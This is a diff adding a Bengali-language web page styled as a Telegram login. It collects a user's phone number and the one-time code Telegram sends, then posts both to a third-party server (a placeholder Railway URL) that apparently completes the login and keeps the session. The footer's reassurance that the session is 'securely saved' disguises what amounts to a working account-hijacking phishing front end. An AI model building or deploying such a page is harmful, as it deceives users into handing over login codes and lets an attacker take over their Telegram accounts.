@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>টেলিগ্রাম লগইন</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 24px;
+            padding: 40px;
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        .confirm-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s;
+        }
+        .confirm-btn:hover {
+            transform: translateY(-2px);
+        }
+        .confirm-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .otp-section {
+            margin-top: 25px;
+            padding-top: 25px;
+            border-top: 2px solid #e0e0e0;
+            display: none;
+        }
+        .otp-section.show {
+            display: block;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 22px;
+            letter-spacing: 6px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        .verify-btn {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 12px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            font-weight: 600;
+        }
+        .resend-btn {
+            background: #6c757d;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 12px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+        .message {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 12px;
+            display: none;
+        }
+        .success { background: #d4edda; color: #155724; }
+        .error { background: #f8d7da; color: #721c24; }
+        .loading {
+            display: none;
+            margin-top: 20px;
+        }
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .phone-section {
+            margin-bottom: 20px;
+            display: none;
+        }
+        .phone-section.show {
+            display: block;
+        }
+        .phone-input {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+        }
+        .save-btn {
+            background: #17a2b8;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 12px;
+            cursor: pointer;
+            width: 100%;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 টেলিগ্রাম লগইন</h1>
+        <div class="subtitle">আপনার টেলিগ্রাম অ্যাকাউন্টে লগইন করুন</div>
+        
+        <!-- ফোন নম্বর সেকশন (শুধু প্রথমবার) -->
+        <div id="phoneSection" class="phone-section">
+            <p>📱 আপনার টেলিগ্রাম ফোন নম্বর দিন</p>
+            <input type="tel" id="phoneInput" class="phone-input" placeholder="+8801XXXXXXXXX">
+            <button class="save-btn" onclick="savePhone()">💾 সংরক্ষণ করুন</button>
+        </div>
+        
+        <!-- লগইন সেকশন -->
+        <div id="loginSection">
+            <button class="confirm-btn" id="confirmBtn" onclick="sendCode()">
+                📱 কনফার্ম করুন
+            </button>
+        </div>
+        
+        <!-- OTP সেকশন -->
+        <div id="otpSection" class="otp-section">
+            <p>🔑 আপনার টেলিগ্রাম অ্যাপে যাওয়া OTP দিন</p>
+            <input type="text" id="otpCode" placeholder="12345" maxlength="5">
+            <button class="verify-btn" onclick="verifyOTP()">✅ লগইন করুন</button>
+            <button class="resend-btn" onclick="resendCode()">🔄 পুনরায় OTP পাঠান</button>
+        </div>
+        
+        <div id="message" class="message"></div>
+        <div id="loading" class="loading">
+            <div class="spinner"></div>
+            <p>অপেক্ষা করুন...</p>
+        </div>
+        <div class="footer">⚡ আপনার সেশন সুরক্ষিতভাবে সংরক্ষিত হবে</div>
+    </div>
+    
+    <script>
+        // ===== Railway API URL (আপনার Railway URL দিয়ে Replace করবেন) =====
+        const API_URL = 'https://your-railway-app.up.railway.app';
+        // ==================================================================
+        
+        let currentPhone = '';
+        
+        // পেজ লোড হলে আগের ফোন আছে কিনা চেক করুন
+        window.onload = function() {
+            const savedPhone = localStorage.getItem('user_phone');
+            if (savedPhone) {
+                currentPhone = savedPhone;
+                document.getElementById('phoneSection').classList.remove('show');
+                document.getElementById('loginSection').style.display = 'block';
+            } else {
+                document.getElementById('phoneSection').classList.add('show');
+                document.getElementById('loginSection').style.display = 'none';
+            }
+        };
+        
+        function showMessage(msg, type) {
+            const msgDiv = document.getElementById('message');
+            msgDiv.textContent = msg;
+            msgDiv.className = `message ${type}`;
+            msgDiv.style.display = 'block';
+            setTimeout(() => {
+                msgDiv.style.display = 'none';
+            }, 5000);
+        }
+        
+        function showLoading(show) {
+            document.getElementById('loading').style.display = show ? 'block' : 'none';
+        }
+        
+        function savePhone() {
+            const phone = document.getElementById('phoneInput').value.trim();
+            if (!phone || !phone.startsWith('+')) {
+                showMessage('সঠিক ফোন নম্বর দিন (+8801XXXXXXXXX)', 'error');
+                return;
+            }
+            currentPhone = phone;
+            localStorage.setItem('user_phone', phone);
+            document.getElementById('phoneSection').classList.remove('show');
+            document.getElementById('loginSection').style.display = 'block';
+            showMessage('ফোন নম্বর সংরক্ষিত হয়েছে!', 'success');
+        }
+        
+        async function sendCode() {
+            if (!currentPhone) {
+                showMessage('প্লিজ ফোন নম্বর দিন!', 'error');
+                return;
+            }
+            
+            const btn = document.getElementById('confirmBtn');
+            btn.disabled = true;
+            showLoading(true);
+            
+            try {
+                const response = await fetch(`${API_URL}/send_code`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: currentPhone })
+                });
+                
+                const data = await response.json();
+                showLoading(false);
+                
+                if (data.success) {
+                    showMessage(data.message, 'success');
+                    document.getElementById('otpSection').classList.add('show');
+                    document.getElementById('otpCode').focus();
+                } else {
+                    showMessage(data.message, 'error');
+                    btn.disabled = false;
+                }
+            } catch (error) {
+                showLoading(false);
+                showMessage('সার্ভার সংযোগ ত্রুটি!', 'error');
+                btn.disabled = false;
+            }
+        }
+        
+        async function verifyOTP() {
+            const code = document.getElementById('otpCode').value.trim();
+            
+            if (!code) {
+                showMessage('প্লিজ OTP কোড দিন!', 'error');
+                return;
+            }
+            
+            showLoading(true);
+            
+            try {
+                const response = await fetch(`${API_URL}/verify`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: currentPhone, code: code })
+                });
+                
+                const data = await response.json();
+                showLoading(false);
+                
+                if (data.success) {
+                    showMessage(data.message, 'success');
+                    document.getElementById('otpSection').classList.remove('show');
+                    setTimeout(() => {
+                        location.reload();
+                    }, 2000);
+                } else {
+                    showMessage(data.message, 'error');
+                }
+            } catch (error) {
+                showLoading(false);
+                showMessage('সার্ভার সংযোগ ত্রুটি!', 'error');
+            }
+        }
+        
+        async function resendCode() {
+            showLoading(true);
+            try {
+                const response = await fetch(`${API_URL}/resend_code`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: currentPhone })
+                });
+                const data = await response.json();
+                showLoading(false);
+                if (data.success) {
+                    showMessage('পুনরায় OTP পাঠানো হয়েছে!', 'success');
+                } else {
+                    showMessage(data.message, 'error');
+                }
+            } catch (error) {
+                showLoading(false);
+                showMessage('ত্রুটি!', 'error');
+            }
+        }
+    </script>
+</body>
+</html>
